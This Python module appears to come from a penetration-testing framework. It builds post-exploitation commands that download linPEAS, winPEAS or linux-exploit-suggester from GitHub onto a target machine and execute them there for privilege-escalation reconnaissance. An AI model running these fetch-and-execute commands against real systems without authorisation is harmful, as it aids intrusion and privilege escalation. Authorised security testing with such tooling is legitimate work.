"""Enumeration helpers for post-exploitation tooling."""

from __future__ import annotations

from pathlib import Path

from ofx.settings import DATA_DIR

from .transfer import build_download_command

__all__ = [
    "bundled_tool_path",
    "linpeas_command",
    "linux_exploit_suggester_command",
    "winpeas_command",
]

_PEASS_TAG = "20251201-130af74a"

LINPEAS_URL = (
    f"https://github.com/peass-ng/PEASS-ng/releases/download/{_PEASS_TAG}/linpeas.sh"
)
WINPEAS_URL = f"https://github.com/peass-ng/PEASS-ng/releases/download/{_PEASS_TAG}/winPEASx64.exe"
LES_URL = "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"


def bundled_tool_path(filename: str) -> Path:
    """Return the bundled tool path under the data directory."""
    return DATA_DIR / "post" / filename


def _prefer_local(local_path: Path | None) -> bool:
    return local_path is not None and local_path.exists()


def linpeas_command(
    url: str | None = None,
    dest: str = "/tmp/linpeas.sh",
    *,
    prefer_local: bool = True,
    local_path: Path | None = None,
) -> str:
    """Build a command to run linPEAS.

    If prefer_local=True and a bundled/local path exists, returns a command that
    assumes the file is already present at `dest` on the target (upload first).
    Otherwise downloads from url and executes.
    """
    local_path = local_path or bundled_tool_path("linpeas.sh")
    if prefer_local and _prefer_local(local_path):
        return f"chmod +x '{dest}' && '{dest}'"
    download = build_download_command(url or LINPEAS_URL, dest, platform="unix")
    return f"{download} && chmod +x '{dest}' && '{dest}'"


def linux_exploit_suggester_command(
    url: str | None = None,
    dest: str = "/tmp/linux-exploit-suggester.sh",
    *,
    prefer_local: bool = True,
    local_path: Path | None = None,
) -> str:
    """Build a command to run linux-exploit-suggester.

    If prefer_local=True and a bundled/local path exists, returns a command that
    assumes the file is already present at `dest` on the target (upload first).
    Otherwise downloads from url and executes.
    """
    local_path = local_path or bundled_tool_path("linux-exploit-suggester.sh")
    if prefer_local and _prefer_local(local_path):
        return f"chmod +x '{dest}' && '{dest}'"
    download = build_download_command(url or LES_URL, dest, platform="unix")
    return f"{download} && chmod +x '{dest}' && '{dest}'"


def winpeas_command(
    url: str | None = None,
    dest: str = "C:\\Windows\\Temp\\winpeas.exe",
    *,
    prefer_local: bool = True,
    local_path: Path | None = None,
) -> str:
    """Build a command to run winPEAS.

    If prefer_local=True and a bundled/local path exists, returns a command that
    assumes the file is already present at `dest` on the target (upload first).
    Otherwise downloads from url and executes.
    """
    local_path = local_path or bundled_tool_path("winpeas.exe")
    if prefer_local and _prefer_local(local_path):
        return f'"{dest}"'
    download = build_download_command(url or WINPEAS_URL, dest, platform="windows")
    return f'{download} && "{dest}"'
